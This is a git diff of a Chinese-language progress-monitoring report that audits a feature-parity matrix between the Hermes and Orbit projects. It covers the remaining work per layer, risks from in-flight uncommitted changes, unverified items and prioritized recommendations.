-| 1 | **L9 记忆层（5 ⬜ + 3 🟡）** | **剩余最大块**：USER.md 用量自曝头、8 个外部 provider（`available()` 恒 False）、holographic、写入门禁、漂移防护 | 8 条 |
-| 2 | **L4 模型适配（3 ⬜ + 4 🟡）** | `proxy` / `egress` / 三级能力元数据 / TTS-STT；🟡 里 4.1 只 16/48 profile、4.2 只 3 transport、4.9 只 4/18 槽位 | 7 条 |
-| 3 | **L1 入口（3 ⬜ + 5 🟡）** | `serve` / `desktop` / `gui` / `acp`；🟡 里全局 23 flag 与二级/三级实现率 | 8 条 |
-| 4 | **L5 工具剩余（2 ⬜ + 4 🟡）** | 缺媒体生成、视觉、TTS、kanban、cronjob、桌面窗口、协作消息、HomeAssistant | 差 65 个工具 |
-| 5 | **L7 剩余（2 ⬜ + 3 🟡）** | hub 远端索引、sync 三方合并、`skills_guard` 107 条威胁模式 | 5 条 |
-| 6 | **L13 插件（1 ⬜ + 4 🟡）** | dashboard 插件契约、懒发现、`all`/`pack` CLI | 5 条 |
-| 7 | **L10 持久化（1 ⬜ + 5 🟡）** | 🟡 集中在 10.1（写侧未统一）、10.4（压缩阈值）、10.9（非影子 git）、10.11（无 schema_version 表）、10.13（19 子命令实现 8） | 6 条 |
-| 8 | **L2 核心循环（1 ⬜ + 3 🟡）** | 心跳判卡死、swarm 调度、后台学习回路 | 4 条 |
-| 9 | **L8 MCP（2 ⬜ + 2 🟡）** | OAuth 真流程、optional-mcps 63 模板、schema 缓存 | 4 条 |
-| 10 | **L15 可观测性（2 ⬜）** | metrics schema（**轮中在飞**）、observability exporter 插件 | 2 条 |
+| 1 | **2.1** | 单循环 + 传输适配器归一化多 provider | 【推断】层（Hermes 源码在 PYZ 内） |
+| 2 | **5.7** | `hook_output_spill`（10,000 / head 500 / tail 500）+ `spill_safety` 拒符号链接 | **轮末看到 `budget.py` 正在被改，可能就在做这条** |
+| 3 | **5.14** | 内置工具数量对齐（94 个；Orbit 现 29+） | 差 65 个工具 |
+| 4 | **7.16** | `orbit sync`（跨设备技能同步 + 三方合并） | 体量最大的一条 |
+| 5 | **7.18** | 技能库规模（Hermes 21 类目 / 91 技能） | 规模类，非机制 |
+| 6 | **8.7** | MCP schema 缓存 | **轮末看到 `mcp_schema_cache.py` 新建，正在做** |
+| 7 | **8.10** | optional-mcps 预置目录（63 个服务模板） | 纯数据活 |
+| 8 | **9.14** | 核心零向量（向量只在 provider 里） | 这是一条"**证明没有**"的条目 |
+
+> 注意 **9.14 是反向条目**（要求"核心**不含**向量"）。它不能靠写代码完成，只能靠"扫依赖 + 扫 import 并给出证据"来完成——建议把它做成一条**可复跑的门禁**（`grep -r 'lancedb|chromadb|faiss' app/` 必须为空），否则它会永远挂在 ⬜ 上。
+
+### 46 条 🟡 的分布（这才是真正的剩余工作）
+
+| 层 | 🟡 | 主要内容 |
+|---|---|---|
+| L4 | 5 | 4.1 只 16/48 profile、4.2 只 3/5 transport、4.9 只 4/18 槽位 等 |
+| L10 | 5 | 10.1 写侧未统一、10.4 压缩阈值未接、10.9 非影子 git、10.11 无 schema_version 表、10.13 19 子命令实现 8 |
+| L13 | 5 | dashboard 插件契约、懒发现、`all`/`pack` CLI 等 |
+| L1 | 5 | 全局 23 flag、二级/三级实现率、`serve`/`desktop`/`gui` 等 |
+| L5 | 4 | 媒体生成、视觉、TTS、kanban、cronjob、桌面窗口、协作消息、HomeAssistant |
+| L9 | 4 | USER.md 用量头、8 个外部 provider（`available()` 恒 False）、写入门禁余项、漂移防护 |
+| L14 | 4 | tirith 已 ✅；egress 代理、`path_security`/`url_safety` 四件套、脱敏出口未全覆盖 |
+| L2 | 3 | 心跳判卡死、swarm 调度、后台学习回路 |
+| L7 | 3 | hub 远端索引、`skills_guard` 107 条威胁模式、7.17 语义差异 |
+| L12 | 3 | 19 个平台适配器全是占位、peer、monitoring 导出 |
+| L6 | 2 | toolset 覆盖 13/32、四层过滤只做平台层 |
+| L8 | 2 | OAuth 真流程、`orbit mcp` 剩余子命令 |
+| L16 | 1 | dashboard 剩余页面语义 |
 
 ---
 
 ## 风险与漂移
 
-### R1 🟠 **轮中工作树被破坏：4 个未跟踪文件在 11:58 落地，导致我的 mypy 读数与你的不同**
+### R1 🟡 **轮末出现 2 个在飞改动（本轮基线取自轮初，不受影响）**
 
-- **轮初** `git status --porcelain` 为空 ✓（与你说的一致）
-- **轮末** 出现 4 个未跟踪文件：`app/metrics_schema.py`（mtime **11:58:01**）、`app/exporters.py`、`app/cli/commands/observability_extra.py`、`tests/test_observability_export.py` —— **有人在我巡检期间开始写 W12 剩余部分**
-- 后果：`mypy` 我读到 **122 files / 2 errors**，而你读到 **120 files / clean**。两个错误**全部落在未跟踪的 `metrics_schema.py`**（`:49` 与 `:63`，都是 `_check(isinstance(x, str) and x, ...)` 让 mypy 推出 `Literal[False] | str`）：
 ```
-app\metrics_schema.py:49: error: Argument 1 to "_check" has incompatible type "Literal[False] | str"; expected "bool"
-app\metrics_schema.py:63: error: ... 同上
-Found 2 errors in 1 file (checked 122 source files)
+轮初 git status: 0 条目  ✓（与你说的一致）
+轮末 git status: 2 条目
+   M backend/app/budget.py                 ← 可能在收 5.7 hook_output_spill
+   ?? backend/app/mcp_schema_cache.py      ← 明确是 8.7 MCP schema cache
 ```
-- **判定：不是已提交代码的回归**（120 + 2 个新 app 文件 = 122，数字完全对得上）。**已提交树 mypy 仍 clean。**
-- **教训（对我自己）**：基线要在**轮末再确认一次 `git status`**，不能只在轮初看一次。本轮我第一眼看到干净就默认了，直到跑 mypy 发现文件数不对才回头查——**如果我只报"mypy 2 errors"而不查 git，就会误报一次回归**。
-- **轮末复查（写完本报告后再次 `git status`）**：条目从 4 涨到 **6**，新增 ` M backend/app/cli/commands/__init__.py`（**有人正在把 W12 的命令注册进去**）与 ` M PROGRESS.md`（本报告自身）。→ **在飞施工仍在继续**，下一轮开头 `REGISTRY` 数字很可能又变（顶层 81 可能涨）。**本报告的所有硬口径均以 `HEAD 5c7d534` 的已提交状态为准。**
+→ **本轮所有硬口径均取自轮初的 `HEAD a693224`**；这两个改动落地后 `REGISTRY` 与测试数都会再变。**上轮的教训（轮初轮末各查一次 git）本轮已执行，也确实又抓到了在飞施工。**
 
-### R2 🟡 **10.5 的「177,015 字节」不可复现（见 A⑥）**
+### R2 🟠 **7.17 的行为差异未标注（本轮唯一的新发现，见 C 节）**
 
-机制成立、算术自洽，但**与本机 Hermes 现库不符**（我实测 646,148 字节 / 18 份）。目前**不构成独立证据**。建议换数字或补查询口径。
+Hermes 的 `journey delete/edit` **真删/真编辑**，Orbit **只写旁注 + 墓碑**。取舍正确，但 MATRIX 标 ✅ 且未标差异。**这类"行为差异未标注"比数字错更难发现**——它不会让任何测试红，也不会让计数异常。
 
-### R3 🟡 **L2 的计数：你说 ✅6/🟡2/⬜1（=9），我实测 ✅6/🟡3/⬜1（=10）**
+### R3 🟡 **「同名不同语义」这个类别建议做成常设检查**
 
-总数 10 条，你的三个数字加起来是 9 —— **少算了 1 条 🟡**。以我实测为准：**L2 = ✅6 · 🟡3 · ⬜1**。
+本轮按你的要求抽查了 4 个名字，抓到 1 条（7.17）。建议把它固化成一张小表（Hermes 命令名 → Hermes 语义 → Orbit 语义 → 是否一致），**在 MATRIX 里加一列或单独一张附页**。目前 9.16 的教训（`profile` = distribution ≠ 用户画像）已经说明这类错误**能潜伏 8 轮不被发现**。
 
 ### R4 🟡 **未验证项（如实标注）**
 
 | 项 | 为什么没验 |
 |---|---|
-| 10.12 的 `sessions reindex` / `sessions search` 实跑 | 会写 `fts.sqlite` → 未运行；只核了代码与 docstring 里的本机实测记录 |
-| 8.6 心跳宽限秒数与退避序列 | 只核到机制与常量引用（连续 3 轮如此） |
-| 9.15 / 14.6 / 14.10 等未抽查的新 ✅ | 本轮 15 条转 ✅ 中复核 11 条 |
+| 9.12 的**端到端** CLI exit 3 | 全新 `--data-dir` 缺 `app.sqlite`，补库要跑 `orbit setup`（改状态）→ 未运行。**门禁逻辑 + 调用点 + 退出码映射三段已核** |
+| `profile show` 的 `_BOUND` 重绑修复 | 未单独复核（你交代的第 2 条） |
+| 8.6 心跳宽限秒数与退避序列 | 只核到机制与常量引用（连续 4 轮如此） |
+| 本轮 11 条转 ✅ 中未抽查的 2 条 | 9 条已核 |
 | `orbit chat` 交互、`gateway start`、`cron run`、`backup create/restore`、`config edit`、`doctor --fix/--live` | 会改状态或真发请求 → 未运行 |
-| `matrix_stats.py` 的重复编号端到端 exit 1 | 只读固定 MATRIX.md、无路径参数（第 4 轮起一直如此） |
-
-### R5 🟢 **上轮建议全部落地（记录以免重复提）**
-
-| 上轮建议 | 本轮实测 |
-|---|---|
-| 修 `count()` 读状态列 | ✅ 已修，且**多修了一层**（转义竖线） |
-| 加两条格式门禁 | ✅ `status_column_problems()` 已实现，docstring 记录成因 |
-| 清掉 10.1 的「变 ✅」污染 | ✅ 已改「可转 done」，全表无第二个符号 |
-| 给 2.6/2.7 补接线点 | ✅ MATRIX 已写；L2 从 ✅1 → ✅6 |
 
 ---
 
@@ -304,15 +308,15 @@ Found 2 errors in 1 file (checked 122 source files)
 
 按优先级：
 
-1. **【P0】把 R1 的教训固化成流程**：基线三件套改成「轮初 `git status` → 跑全量 → **轮末再 `git status`**」，三者不一致时以"已跟踪文件"为准重算。本轮我差点把在飞文件的 mypy 错误报成回归。
-2. **【P0】处理 10.5 的 177,015 数字**（R2）：换成可复现的 **646,148 字节 / 18 份**（附我用的只读查询），或删掉数字只留机制。**这是本轮唯一一条"引用了不可复现数字"的 ✅**，而它的机制本身是硬的，改一下就行。
-3. **【P0】立一条"如实说没有 ≠ 有"的抽查规则**（你提的那条）：凡是 `done` 的命令，验证输出是"真的做了"还是"解释为什么没做"。本轮 egress 6 条已修，建议在 `matrix_stats` 里加一条启发式——**扫描 `done` 命令的输出文案里是否含「未实现 / 没有这一层 / 尚未支持」**，命中就报警。
-4. **【P1】L9 记忆层是剩余最大块（5 ⬜ + 3 🟡，8 条）**：且缺的多是**可离线验证、测试好写**的（USER.md 用量头、写入门禁、漂移防护、CJK 已由 10.12 的 `fts.sqlite` 铺好路）。Orbit 已有 memories 表 + USER.md 底座，比新开层便宜。
-5. **【P1】L4 的 4 条 🟡 值得一次性收口**：4.1（16/48 profile）、4.2（3/5 transport）、4.9（4/18 槽位）、4.4 已 ✅。**加 profile 是纯数据活**（照 06 调研的表抄），性价比高于写新逻辑。
-6. **【P2】10.1 该决断了**（🟡 已挂 3 轮）：要么让 cron/gateway/agent 的写入过 plane（变 ✅），要么把条目判据改成"统一读视图"、把"同库同表"降为差异说明。现在它挂着 🟡，且**它的证据栏里不能再出现 ✅ 字样**（门禁已防，但措辞上还是容易踩）。
-7. **【P2】把"轮中在飞文件"做成可见状态**：建议在 `matrix_stats.py` 里加一行「未跟踪文件 N 个（可能影响 mypy/测试读数）」的提示。本轮若有这行，我一眼就能看出 mypy 差异的来源。
-8. **【P2】复核 `08` 的「15 条已声明未消费」剩余 13 条**：连续 6 轮未核。本轮顺带看到 `nodes.py:139 context_meta.setdefault("compressed", {})` 仍是空占位——正是那 15 条之一。
+1. **【P0】给 7.17 补「行为差异」标注**（R2）：Hermes 真删/真编辑 vs Orbit 只写旁注 + 墓碑。**这是本轮唯一一条"✅ 撑得住但语义未对齐"的条目**，而它恰好落在你担心的那一类上。补一句就行，不必降级——取舍是对的，只要说出来。
+2. **【P0】把「同名不同语义」做成常设检查**（R3）：建议在 MATRIX 加一列 `语义一致性`（一致 / 有意差异 / 待核），并先过一遍全部 181 条里的**命令类条目**（L1/L7/L8/L10/L11/L12/L13）。9.16 那条潜伏了 8 轮，说明这个风险是真实的。
+3. **【P0】9.14 是"证明没有"型条目**，不能靠写代码完成：建议做成可复跑门禁（`grep -r 'lancedb|chromadb|faiss|sentence_transformers' app/` 必须空 + `pyproject.toml` 无相关依赖），跑通即 ✅。否则它会永远挂 ⬜。
+4. **【P1】5.7 / 8.7 已在收尾**（轮末看到 `budget.py` 改动与 `mcp_schema_cache.py` 新建）：这两条收掉后 ⬜ 只剩 6 条，其中 4 条是**规模/数据类**（5.14 工具数、7.18 技能数、8.10 63 模板、7.16 sync）。
+5. **【P1】46 条 🟡 才是真正的大头**：其中 **L4 的 5 条**（4.1 只 16/48 profile、4.2 只 3/5 transport、4.9 只 4/18 槽位）**基本都是"照 06 调研的表抄数据"**，纯数据活、无新逻辑，是性价比最高的一块。
+6. **【P1】L10 的 5 条 🟡 里有 3 条是"取舍类"**（10.1 非同库同表、10.9 非影子 git、10.11 无 schema_version 表）——这些**可能永远不该变 ✅**。建议给这类加一个状态 **🟢「有意差异」**，否则完成度永远卡在 70% 出头，且读者分不清"没做"和"故意不做"。
+7. **【P2】给每条 ✅ 补「验证命令」列**：本轮 9.12（in-process 调 `check_write`）、9.11（`H.DIM` + 三个权重用例）、4.10（`resolve()` 逐字段 None）都是可一键复跑的；把这种断言补到其余条目，下轮监视不必重读源码。
+8. **【P2】复核 `08` 的「15 条已声明未消费」剩余 13 条**：连续 7 轮未核。本轮顺带看到 `nodes.py:139 context_meta.setdefault("compressed", {})` 仍是空占位——正是那 15 条之一。
 
 ---
 
-*本报告由 monitor 角色只读生成。本轮 15 条转 ✅ 复核 11 条（73%），你点名的 7 条里 **6 条完全撑得住、1 条（10.5）机制成立但引用的数字不可复现**；两处披露**全部复核成立**；`test_graph` 竞态**我更正了自己第 3–7 轮的误判**（"负载敏感"→"竞态，已修复"）。未验证项单列，不混进完成项。*
+*本报告由 monitor 角色只读生成。本轮 11 条转 ✅ 复核 9 条（82%），你点名的 7 条**全部撑得住**；两处交代**全部成立**（9.16 的 13 条子命令我从 `_raw` 独立数过，逐条相同）；按你的要求抽查「同名不同语义」抓到 **1 条（7.17 行为差异未标注）**。9.12 的端到端 CLI 因需先建库而未跑，已如实标注。未验证项单列，不混进完成项。*
